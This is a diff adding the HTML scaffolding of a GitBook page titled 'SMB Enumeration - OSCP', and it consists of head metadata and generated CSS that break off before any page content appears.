@@ -1,0 +1,2074 @@
+
+    <!doctype html>
+    <html >
+        <head>
+            <title data-react-helmet="true">SMB Enumeration - OSCP</title>
+            <meta data-react-helmet="true" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/><meta data-react-helmet="true" charset="utf-8"/><meta data-react-helmet="true" name="google" value="notranslate"/><meta data-react-helmet="true" property="og:image" content="https://app.gitbook.com/share/space/thumbnail/-LkvnWByFHssLOYr3_77.png"/><meta data-react-helmet="true" property="twitter:card" content="summary"/><meta data-react-helmet="true" property="twitter:site" content="OSCP"/><meta data-react-helmet="true" name="description" content=""/><meta data-react-helmet="true" property="og:title" content="SMB Enumeration"/><meta data-react-helmet="true" property="og:description" content=""/>
+            <link data-react-helmet="true" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500&amp;display=swap"/><link data-react-helmet="true" rel="stylesheet" href="https://unpkg.com/emojione-assets@4.0.0/sprites/emojione-sprite-40.min.css"/><link data-react-helmet="true" rel="preconnect" href="https://www.googleapis.com"/><link data-react-helmet="true" rel="preconnect" href="https://api.amplitude.com"/><link data-react-helmet="true" rel="preconnect" href="https://gblobscdn.gitbook.com/"/><link data-react-helmet="true" rel="icon" href="https://gblobscdn.gitbook.com/spaces%2F-LkvnWByFHssLOYr3_77%2Favatar-1588689183922.png?alt=media"/><link data-react-helmet="true" rel="canonical" href="smb-enumeration"/><link data-react-helmet="true" rel="stylesheet" href="https://gstatic.gitbook.com/css/6c3c9dec9383137845be0f0ea2cf1bf4.css"/>
+            <style data-react-helmet="true" type="text/css">
+        @font-face {
+            font-family: "Roboto";
+            src: local("Roboto"), local("Roboto-Regular"), url(https://gstatic.gitbook.com/fonts/fc3d4b35e4d07d4e0485cc2db0e57c77.woff) format('woff');
+            font-weight: 400;
+            font-display: swap;
+        }
+        @font-face {
+            font-family: "Roboto";
+            src: local("Roboto Medium"), local("Roboto-Medium"), url(https://gstatic.gitbook.com/fonts/f4fa50c4003f87e7dc10459e500933c3.woff) format('woff');
+            font-weight: 500;
+            font-display: swap;
+        }
+        @font-face {
+            font-family: "Roboto";
+            src: local("Roboto Bold"), local("Roboto-Bold"), url(https://gstatic.gitbook.com/fonts/72e37e5bf95a8dba938c78b1d7d91253.woff) format('woff');
+            font-weight: 700;
+            font-display: swap;
+        }
+    </style><style data-react-helmet="true" type="text/css">
+        @font-face {
+            font-family: "Content-font";
+            src: local("Roboto"), local("Roboto-Regular"), url(https://gstatic.gitbook.com/fonts/fc3d4b35e4d07d4e0485cc2db0e57c77.woff) format('woff');
+            font-weight: 400;
+            font-display: swap;
+        }
+        @font-face {
+            font-family: "Content-font";
+            src: local("Roboto Medium"), local("Roboto-Medium"), url(https://gstatic.gitbook.com/fonts/f4fa50c4003f87e7dc10459e500933c3.woff) format('woff');
+            font-weight: 500;
+            font-display: swap;
+        }
+        @font-face {
+            font-family: "Content-font";
+            src: local("Roboto Bold"), local("Roboto-Bold"), url(https://gstatic.gitbook.com/fonts/72e37e5bf95a8dba938c78b1d7d91253.woff) format('woff');
+            font-weight: 700;
+            font-display: swap;
+        }
+    </style>
+            <script data-react-helmet="true" type="text/javascript" defer="true" src="https://polyfill.io/v3/polyfill.min.js?flags=gated&amp;features=Intl"></script>
+            <style>#__GITBOOK__ROOT__SERVER__ { width: 100%; height: 100%; display: flex;}</style>
+            <style>#__GITBOOK__ROOT__CLIENT__ { width: 100%; min-height: 100%; height: initial; display: flex;}</style>
+            <style id="__GITBOOK__STYLE__">html, body {
+  color: #242A31;
+  width: 100%;
+  height: 100%;
+  margin: 0;
+  padding: 0;
+  font-size: 15px;
+  background: #F5F7F9;
+  box-sizing: border-box;
+  font-family: "Roboto", sans-serif;
+  line-height: 1em;
+  font-smoothing: antialiased;
+  text-size-adjust: 100%;
+  -ms-text-size-adjust: 100%;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-text-size-adjust: 100%;
+}
+@media screen and (min-width: 768px) {
+  html, body {
+    text-rendering: optimizeLegibility;
+  }
+}
+@media print {
+  html, body {
+    background: transparent;
+  }
+}
+*, *:before, *:after {
+  outline: none;
+  box-sizing: inherit;
+}
+@font-face {
+  font-family: "Flow-Rounded";
+  src: url("https://gstatic.gitbook.com/fonts/bfc0a96537ceb0cad9e956b9f980fe88.woff") format('woff');
+  font-display: block;
+}
+input, select, textarea {
+  font-size: 16px;
+}
+input, select, textarea, button {
+  font: inherit;
+}
+input[type="search"] {
+  -webkit-appearance: none;
+}
+.draggingElement, .draggingElement *:hover {
+  cursor: grabbing !important;
+  pointer-events: auto !important;
+}
+.draggingElement .draggingHidden {
+  display: none;
+}
+
+.reset-3c756112--body-68cac36c {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  color: #242A31;
+  width: 100%;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  background: #F5F7F9;
+  min-height: 100vh;
+  flex-direction: column;
+  -webkit-box-orient: vertical;
+  -webkit-box-direction: normal;
+}
+.reset-3c756112--header-07037613--header-09ef972a {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  height: 80px;
+  margin: 0;
+  display: none;
+  padding: 0;
+  z-index: 20;
+  position: relative;
+  box-shadow: 0 3px 8px 0 rgba(116, 129, 141, 0.1);
+  border-bottom: 1px solid #d4dadf;
+  background-color: #FFFFFF;
+}
+@media print {
+  .reset-3c756112--header-07037613--header-09ef972a {
+    display: none;
+  }
+}
+@media screen and (max-width: 1023px) {
+  .reset-3c756112--header-07037613--header-09ef972a {
+    display: -webkit-box;
+    display: -moz-box;
+    display: -ms-flexbox;
+    display: -webkit-flex;
+    top: 0;
+    width: 100%;
+    display: flex;
+    position: fixed;
+    padding-left: 16px;
+    padding-right: 16px;
+  }
+}
+@media screen and (max-width: 767px) {
+  .reset-3c756112--header-07037613--header-09ef972a {
+    height: 60px;
+    padding-left: 8px;
+    padding-right: 8px;
+  }
+}
+.reset-3c756112--headerContainer-bb8cc0bc {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  width: 100%;
+  margin: 0 auto;
+  display: flex;
+  padding: 0;
+  max-width: 1448px;
+}
+.reset-3c756112--headerLeftColumn-4eae0bae--headerLeftColumn-7efc9f26 {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  width: 100%;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  position: relative;
+  align-items: center;
+  justify-content: space-between;
+  -webkit-box-pack: justify;
+  -webkit-box-align: center;
+}
+@media screen and (min-width: 1024px) {
+  .reset-3c756112--headerLeftColumn-4eae0bae--headerLeftColumn-7efc9f26 {
+    max-width: 298px;
+    justify-content: center;
+    -webkit-box-pack: center;
+  }
+  .reset-3c756112--headerLeftColumn-4eae0bae--headerLeftColumn-7efc9f26:after {
+    top: 50%;
+    right: 0;
+    height: 40px;
+    content: " ";
+    position: absolute;
+    transform: translateY(-50%);
+    border-left: 1px solid #E6ECF1;
+  }
+}
+.reset-3c756112--mobileButton-7a76d05f {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  flex: 0 0 auto;
+  width: 30px;
+  cursor: pointer;
+  height: 30px;
+  margin: 0;
+  display: flex;
+  outline: none;
+  padding: 0;
+  font-size: 18px;
+  align-items: center;
+  justify-content: center;
+  -webkit-box-pack: center;
+  -webkit-box-align: center;
+}
+@media screen and (min-width: 1024px) {
+  .reset-3c756112--mobileButton-7a76d05f {
+    display: none;
+  }
+}
+.icon-7f6730be--text-3f89f380--icon-1f8349b3 {
+  color: #242A31;
+  width: 1em;
+  height: 1em;
+  vertical-align: middle;
+}
+.reset-3c756112--headerLogo-5c0b38e2 {
+  margin: 0;
+  display: block;
+  padding: 0px 24px;
+}
+@media screen and (min-width: 1024px) {
+  .reset-3c756112--headerLogo-5c0b38e2 {
+    width: 250px;
+    padding: 0;
+  }
+}
+.reset-3c756112--mobileLogo-dacfd15c {
+  margin: 0;
+  display: none;
+  padding: 0;
+}
+@media screen and (max-width: 767px) {
+  .reset-3c756112--mobileLogo-dacfd15c {
+    display: block;
+  }
+}
+.link-a079aa82--primary-53a25e66--logoLink-10d08504 {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  color: #3884FF;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  text-decoration: none;
+  -webkit-box-align: center;
+}
+.reset-3c756112--tooltipContainer-7fdb9b70--small-2ec8ae1a {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  width: 30px;
+  height: 30px;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  border-radius: 3px;
+}
+.reset-3c756112--avatarFrame-2f40cdc9--small-2ec8ae1a {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  -webkit-mask-image: -webkit-radial-gradient(white, black);
+  -webkit-mask-image: -moz-radial-gradient(white, black);
+  mask-image: -webkit-radial-gradient(white, black);
+  mask-image: -moz-radial-gradient(white, black);
+  width: 30px;
+  height: 30px;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  overflow: hidden;
+  position: relative;
+  mask-image: radial-gradient(white, black);
+  align-items: center;
+  border-radius: 3px;
+  justify-content: center;
+  -webkit-box-pack: center;
+  -webkit-box-align: center;
+  -webkit-mask-image: radial-gradient(white, black);
+}
+.image-67b14f24--avatar-1c1d03ec {
+  width: 100%;
+  height: 100%;
+  max-width: 100%;
+  background-size: cover;
+  background-color: #FFFFFF;
+  background-repeat: no-repeat;
+}
+.reset-3c756112--S100Left-7c8af13a--logoDisplayNameContainer-583bfe61--logoText-716999b8 {
+  flex: 1;
+  color: #242A31;
+  margin: 0;
+  display: block;
+  padding: 0;
+  padding-left: 8px;
+}
+@media screen and (max-width: 1023px) {
+  .reset-3c756112--S100Left-7c8af13a--logoDisplayNameContainer-583bfe61--logoText-716999b8 {
+    overflow: hidden;
+    max-width: 50vw;
+    white-space: nowrap;
+    text-overflow: ellipsis;
+  }
+}
+.reset-3c756112--S100Left-7c8af13a--logoDisplayNameContainer-583bfe61--logoText-716999b8:hover {
+  color: #df4945;
+}
+.text-4505230f--DisplayH700-a03ad9b4--textContentFamily-49a318e1--spaceNameText-677c2969 {
+  font-size: 24px;
+  font-family: Content-font, Roboto, sans-serif;
+  font-weight: 500;
+  line-height: 1.5;
+  overflow-wrap: break-word;
+}
+.reset-3c756112--desktopLogo-a594db90 {
+  margin: 0;
+  display: block;
+  padding: 0;
+}
+@media screen and (max-width: 767px) {
+  .reset-3c756112--desktopLogo-a594db90 {
+    display: none;
+  }
+}
+.reset-3c756112--tooltipContainer-7fdb9b70--medium-296350e4 {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  width: 40px;
+  height: 40px;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  border-radius: 3px;
+}
+.reset-3c756112--avatarFrame-2f40cdc9--medium-296350e4 {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  -webkit-mask-image: -webkit-radial-gradient(white, black);
+  -webkit-mask-image: -moz-radial-gradient(white, black);
+  mask-image: -webkit-radial-gradient(white, black);
+  mask-image: -moz-radial-gradient(white, black);
+  width: 40px;
+  height: 40px;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  overflow: hidden;
+  position: relative;
+  mask-image: radial-gradient(white, black);
+  align-items: center;
+  border-radius: 3px;
+  justify-content: center;
+  -webkit-box-pack: center;
+  -webkit-box-align: center;
+  -webkit-mask-image: radial-gradient(white, black);
+}
+.reset-3c756112--headerInnerWrapper-629f79d1--headerInnerWrapper-4f99acea {
+  flex: 1 1 auto;
+  margin: 0px 88px;
+  display: block;
+  padding: 0;
+  overflow: hidden;
+  position: relative;
+  max-width: 750px;
+}
+.reset-3c756112--headerInnerWrapper-629f79d1--headerInnerWrapper-4f99acea:after {
+  background: -webkit-linear-gradient(to right, rgba(255,255,255,0) 0%, #FFFFFF 100%);
+  background: -moz-linear-gradient(to right, rgba(255,255,255,0) 0%, #FFFFFF 100%);
+  top: 0;
+  right: 0;
+  width: 32px;
+  height: 100%;
+  content: " ";
+  position: absolute;
+  background: linear-gradient(to right, rgba(255,255,255,0) 0%, #FFFFFF 100%);
+  pointer-events: none;
+}
+@media screen and (max-width: 1439px) {
+  .reset-3c756112--headerInnerWrapper-629f79d1--headerInnerWrapper-4f99acea {
+    margin: 0px 24px 0px 88px;
+  }
+}
+@media screen and (max-width: 1023px) {
+  .reset-3c756112--headerInnerWrapper-629f79d1--headerInnerWrapper-4f99acea {
+    display: none;
+  }
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48 {
+  display: -webkit-box;
+  overflow-x: auto;
+  height: 100%;
+  margin: 0;
+  display: flex;
+  opacity: 1;
+  padding: 0;
+  overflow-x: overlay;
+  overflow-y: hidden;
+  transition: flex 250ms ease,width 250ms ease,opacity 250ms ease;
+  -moz-transition: flex 250ms ease,width 250ms ease,opacity 250ms ease;
+  -webkit-transition: flex 250ms ease,width 250ms ease,opacity 250ms ease;
+  -webkit-overflow-scrolling: touch;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-scrollbar {
+  width: 4px;
+  height: 4px;
+  display: none;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-scrollbar-track {
+  background: none;
+  border-width: 0;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-scrollbar-thumb {
+  background: rgba(0,0,0,.16);
+  transition: background 250ms ease;
+  border-radius: 2px;
+  -moz-transition: background 250ms ease;
+  -webkit-transition: background 250ms ease;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-scrollbar-button {
+  display: none;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-scrollbar-track-piece {
+  display: none;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-scrollbar-corner {
+  display: none;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48::-webkit-resizer {
+  display: none;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48:hover::-webkit-scrollbar {
+  display: initial;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisX-bf86cd6c--headerInner-c872fc48:hover::-webkit-scrollbar-thumb {
+  background: rgba(0,0,0,.16);
+}
+.reset-3c756112--searchInputWrapper-ea7f3052--searchInputWrapper-0442d130 {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  height: 80px;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  position: relative;
+  max-width: 224px;
+  align-items: center;
+  -webkit-box-align: center;
+}
+.reset-3c756112--searchInputWrapper-ea7f3052--searchInputWrapper-0442d130:before {
+  top: 50%;
+  left: 0;
+  height: 40px;
+  content: " ";
+  position: absolute;
+  transform: translateY(-50%);
+  border-left: 1px solid #E6ECF1;
+}
+@media screen and (max-width: 1023px) {
+  .reset-3c756112--searchInputWrapper-ea7f3052--searchInputWrapper-0442d130 {
+    display: none;
+  }
+}
+.reset-3c756112--inputContainer-b2cb171c {
+  margin: 0;
+  display: block;
+  padding: 0;
+  padding-left: 14px;
+  padding-right: 16px;
+}
+.inputInner-5c86b87d--medium-0bbed4bd--inputInner-4216b016--searchInputPlaceholder-936306be {
+  font: inherit;
+  color: #242A31;
+  width: 100%;
+  border: none;
+  cursor: inherit;
+  height: 38px;
+  margin: 0;
+  resize: none;
+  outline: none;
+  padding: 0px 8px;
+  background: transparent;
+  box-sizing: border-box;
+  text-align: left;
+  line-height: inherit;
+  border-radius: 3px;
+}
+.inputInner-5c86b87d--medium-0bbed4bd--inputInner-4216b016--searchInputPlaceholder-936306be::placeholder {
+  color: #9DAAB6;
+  font-size: 16px;
+  font-weight: 500;
+}
+.reset-3c756112--inputWrapper-63396dac--TextH400-3033861f--medium-4505230f--light-502263b4--input-6d442051--searchInput-3fa812d5 {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  width: 100%;
+  border: none;
+  margin: 0;
+  display: flex;
+  outline: none;
+  padding: 0;
+  font-size: 16px;
+  background: #FFFFFF;
+  box-sizing: border-box;
+  font-weight: 400;
+  line-height: 1.625;
+  border-radius: 3px;
+  background-color: #FFFFFF;
+}
+.reset-3c756112--inputInnerSizer-756c9114 {
+  flex: 1;
+  margin: 0;
+  display: block;
+  padding: 0;
+}
+.reset-3c756112--inputAddOn-45de9ec1--inputAddOnPrefix-202fa60d--icon-1f8349b3 {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  flex: 0 0 auto;
+  color: #242A31;
+  order: -1;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  align-items: center;
+  line-height: 1.2;
+  white-space: nowrap;
+  padding-left: 8px;
+  -webkit-box-align: center;
+}
+.icon-7f6730be--text-3f89f380 {
+  width: 1em;
+  height: 1em;
+  vertical-align: middle;
+}
+.reset-3c756112--bodyContent-2f98451b {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  flex: 1;
+  color: #3B454E;
+  width: 100%;
+  margin: 0 auto;
+  display: flex;
+  padding: 0;
+}
+.reset-3c756112--wholeContent-9fc567d4 {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  width: 100%;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  position: relative;
+  min-height: 100%;
+  flex-direction: column;
+  -webkit-box-orient: vertical;
+  -webkit-box-direction: normal;
+}
+.reset-3c756112--wholeContentBody-554be184 {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  flex: 1;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  transition: margin-bottom 250ms ease;
+  align-items: stretch;
+  -moz-transition: margin-bottom 250ms ease;
+  -webkit-box-align: stretch;
+  -webkit-transition: margin-bottom 250ms ease;
+}
+@media screen and (max-width: 1023px) {
+  .reset-3c756112--wholeContentBody-554be184 {
+    padding-top: 80px;
+  }
+}
+@media screen and (max-width: 767px) {
+  .reset-3c756112--wholeContentBody-554be184 {
+    padding-top: 60px;
+  }
+}
+@keyframes keyframes-animation-2f81d449-0-1-543 {
+  0% {
+    background-color: rgba(24, 48, 85, 0);
+  }
+  100% {
+    background-color: rgba(24, 48, 85, 0.30000000000000004);
+  }
+}
+.reset-3c756112--backdrop-1322b68a--hidden-247382c3--overlay-29559ab8 {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  z-index: 29;
+  position: absolute;
+  transition: background-color 250ms ease-out;
+  align-items: center;
+  animation-name: none;
+  pointer-events: none;
+  -moz-transition: background-color 250ms ease-out;
+  justify-content: center;
+  -webkit-box-pack: center;
+  background-color: rgba(24, 48, 85, 0);
+  -webkit-box-align: center;
+  -webkit-transition: background-color 250ms ease-out;
+  animation-duration: 0.2s;
+  animation-fill-mode: forwards;
+  animation-timing-function: ease-out;
+}
+@media screen and (min-width: 1024px) {
+  .reset-3c756112--backdrop-1322b68a--hidden-247382c3--overlay-29559ab8 {
+    z-index: 14;
+  }
+}
+.reset-3c756112--contentNavigation-dd3370a4 {
+  margin: 0;
+  display: block;
+  padding: 0;
+  z-index: 30;
+}
+@media print {
+  .reset-3c756112--contentNavigation-dd3370a4 {
+    display: none;
+  }
+}
+@media screen and (min-width: 1024px) {
+  .reset-3c756112--contentNavigation-dd3370a4 {
+    display: -webkit-box;
+    display: -moz-box;
+    display: -ms-flexbox;
+    display: -webkit-flex;
+    flex: 0 0 auto;
+    width: calc((100% - 1448px) / 2 + 298px);
+    display: flex;
+    z-index: 15;
+    min-width: 298px;
+    background: #F5F7F9;
+    align-items: stretch;
+    border-right: 1px solid #E6ECF1;
+    padding-left: calc((100% - 1448px) / 2);
+    flex-direction: column;
+    -webkit-box-align: stretch;
+    -webkit-box-orient: vertical;
+    -webkit-box-direction: normal;
+  }
+}
+.reset-3c756112--contentNavigationInner-205d49ea--contentNavigationInnerCollapsed-7b4aca00 {
+  flex: 1;
+  margin: 0;
+  display: block;
+  padding: 0;
+}
+@media screen and (max-width: 1023px) {
+  .reset-3c756112--contentNavigationInner-205d49ea--contentNavigationInnerCollapsed-7b4aca00 {
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 30;
+    position: fixed;
+    max-width: 298px;
+    transform: translateX(-100%) !important;
+    box-shadow: none;
+    overflow-y: auto;
+    transition: transform 250ms ease;
+    border-right: 1px solid #E6ECF1;
+    -moz-transition: transform 250ms ease;
+    background-color: #fff;
+    -webkit-transition: transform 250ms ease;
+  }
+}
+.reset-3c756112--sidebarWrapper-84a13d8e {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  flex: auto;
+  width: 100%;
+  height: 100%;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  align-items: stretch;
+  flex-direction: column;
+  -webkit-box-align: stretch;
+  -webkit-box-orient: vertical;
+  -webkit-box-direction: normal;
+}
+.reset-3c756112 {
+  margin: 0;
+  display: block;
+  padding: 0;
+}
+.reset-3c756112--sidebar-84a13d8e {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  flex: auto;
+  width: 100%;
+  height: 100%;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  align-items: stretch;
+  flex-direction: column;
+  -webkit-box-align: stretch;
+  -webkit-box-orient: vertical;
+  -webkit-box-direction: normal;
+}
+.reset-3c756112--navigationHeader-2c71cfec {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  flex: 0 0 auto;
+  height: 80px;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  align-items: center;
+  margin-left: 24px;
+  border-bottom: 1px solid #E6ECF1;
+  padding-right: 12px;
+  flex-direction: row;
+  -webkit-box-align: center;
+  -webkit-box-orient: horizontal;
+  -webkit-box-direction: normal;
+}
+@media screen and (max-width: 1023px) {
+  .reset-3c756112--navigationHeader-2c71cfec {
+    display: none;
+  }
+}
+.reset-3c756112--navigationHeaderLogo-756c9114 {
+  flex: 1;
+  margin: 0;
+  display: block;
+  padding: 0;
+}
+.button-36063075--medium-6e2a217a--button-d204befe--medium-54db2ab3 {
+  display: -webkit-inline-box;
+  display: -moz-inline-box;
+  display: -ms-inline-flexbox;
+  display: -webkit-inline-flex;
+  color: #9DAAB6;
+  width: 40px;
+  border: 1px solid;
+  cursor: pointer;
+  height: 40px;
+  display: inline-flex;
+  outline: none;
+  padding: 0;
+  transition: all 250ms ease-out;
+  align-items: center;
+  line-height: 1em;
+  white-space: nowrap;
+  border-color: transparent;
+  border-radius: 3px;
+  -moz-transition: all 250ms ease-out;
+  justify-content: center;
+  text-decoration: none;
+  -webkit-box-pack: center;
+  background-color: transparent;
+  -webkit-box-align: center;
+  -webkit-transition: all 250ms ease-out;
+}
+.button-36063075--medium-6e2a217a--button-d204befe--medium-54db2ab3:disabled {
+  opacity: 0.5;
+  pointer-events: none;
+}
+.button-36063075--medium-6e2a217a--button-d204befe--medium-54db2ab3:hover {
+  color: #df4945;
+}
+.medium-3bde6db7--iconOnly-bddce91a {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  margin: 0;
+  display: flex;
+  font-size: 18px;
+  align-items: center;
+  justify-content: center;
+  -webkit-box-pack: center;
+  -webkit-box-align: center;
+}
+.text-4505230f--UIH400-4e41e82a--textUIFamily-5ebd8e40--text-8ee2c8b2 {
+  font-size: 16px;
+  font-family: "Roboto", sans-serif;
+  font-weight: 500;
+  line-height: 1em;
+}
+.reset-3c756112--sidebarMain-13701e8f--sidebarMainWithHeader-7d9d70ef {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  height: calc(100% - 80px);
+  margin: 0;
+  display: flex;
+  padding: 0;
+  overflow-y: hidden;
+  flex-direction: column;
+  background-color: #F5F7F9;
+  -webkit-box-orient: vertical;
+  -webkit-box-direction: normal;
+}
+@media screen and (max-width: 1023px) {
+  .reset-3c756112--sidebarMain-13701e8f--sidebarMainWithHeader-7d9d70ef {
+    height: 100%;
+  }
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe {
+  overflow-y: auto;
+  flex: 1 1 auto;
+  width: 100%;
+  margin: 0;
+  display: block;
+  padding: 0;
+  overflow-x: hidden;
+  overflow-y: overlay;
+  -webkit-overflow-scrolling: touch;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-scrollbar {
+  width: 4px;
+  height: 4px;
+  display: none;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-scrollbar-track {
+  background: none;
+  border-width: 0;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-scrollbar-thumb {
+  background: rgba(0,0,0,.16);
+  transition: background 250ms ease;
+  border-radius: 2px;
+  -moz-transition: background 250ms ease;
+  -webkit-transition: background 250ms ease;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-scrollbar-button {
+  display: none;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-scrollbar-track-piece {
+  display: none;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-scrollbar-corner {
+  display: none;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe::-webkit-resizer {
+  display: none;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe:hover::-webkit-scrollbar {
+  display: initial;
+}
+.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--sidebarInner-18a1e7fe:hover::-webkit-scrollbar-thumb {
+  background: rgba(0,0,0,.16);
+}
+.reset-3c756112--mobileHeader-4e2d4892 {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  color: #74818D;
+  height: 59px;
+  margin: 0;
+  display: flex;
+  padding: 0;
+  box-shadow: 0 1px 1px 0 rgba(116, 129, 141, 0.1);
+  align-items: stretch;
+  border-bottom: 1px solid #d4dadf;
+  background-color: #FFFFFF;
+  -webkit-box-align: stretch;
+}
+@media screen and (min-width: 768px) {
+  .reset-3c756112--mobileHeader-4e2d4892 {
+    display: none;
+  }
+}
+.reset-3c756112--mobileHeaderClose-47b8fa64 {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  cursor: pointer;
+  margin: 0;
+  display: flex;
+  padding: 8px 16px;
+  font-size: 24px;
+  align-items: center;
+  -webkit-box-align: center;
+}
+.reset-3c756112--pagesTree-4b07cd56 {
+  margin: 0;
+  display: block;
+  padding: 0;
+  font-size: 15px;
+  margin-top: 32px;
+  padding-left: 16px;
+}
+@media screen and (min-width: 768px) {
+  .reset-3c756112--pagesTree-4b07cd56 {
+    padding-left: 24px;
+  }
+}
+.reset-3c756112--pageItem-01e3f344 {
+  margin: 0;
+  display: block;
+  padding: 0;
+  position: relative;
+  border-left: 1px solid transparent;
+}
+.reset-3c756112--pageComponent-7cc5301a {
+  margin: 0;
+  display: block;
+  padding: 0;
+  margin-left: -1px;
+}
+.navButton-94f2579c--navButtonClickable-161b88ca {
+  display: -webkit-box;
+  display: -moz-box;
+  display: -ms-flexbox;
+  display: -webkit-flex;
+  color: inherit;
+  border: 1px solid transparent;
+  cursor: pointer;
+  display: flex;
+  padding: 7px 24px 7px 16px;
+  position: relative;
+  align-items: center;
+  border-right: 0;
+  text-decoration: none;
+  -webkit-box-align: center;
+}
+.navButton-94f2579c--navButtonClickable-161b88ca:hover {
+  background-color: #E6ECF1;
+}
+.text-4505230f--UIH300-2063425d--textContentFamily-49a318e1--navButtonLabel-14a4968f {
+  flex: 1;
+  font-size: 14px;
+  word-break: break-word;
+  font-family: Content-font, Roboto, sans-serif;
+  font-weight: 500;
+  line-height: 1.5;
+}
+.reset-3c756112--pageItemWithChildren-56f27afc {
+  margin: 0;
+  display: block;
+  padding: 0;
+  position: relative;
+}
+.reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312 {
+  color: #9DAAB6;
+  cursor: pointer;
+  margin: -8px;
+  display: block;
+  padding: 8px;
+  position: relative;
+  font-size: 18px;
+  line-height: 1;
+  margin-left: 0;
+}
+.reset-3c756112--navButtonIcon-433c72ce--navButtonIconClickable-11a89312:hover {
+  color: #5C6975;
+}
+.icon-7f6730be--text-3f89f380--pageDocumentIconExpanded-014d853c {
+  width: 1em;
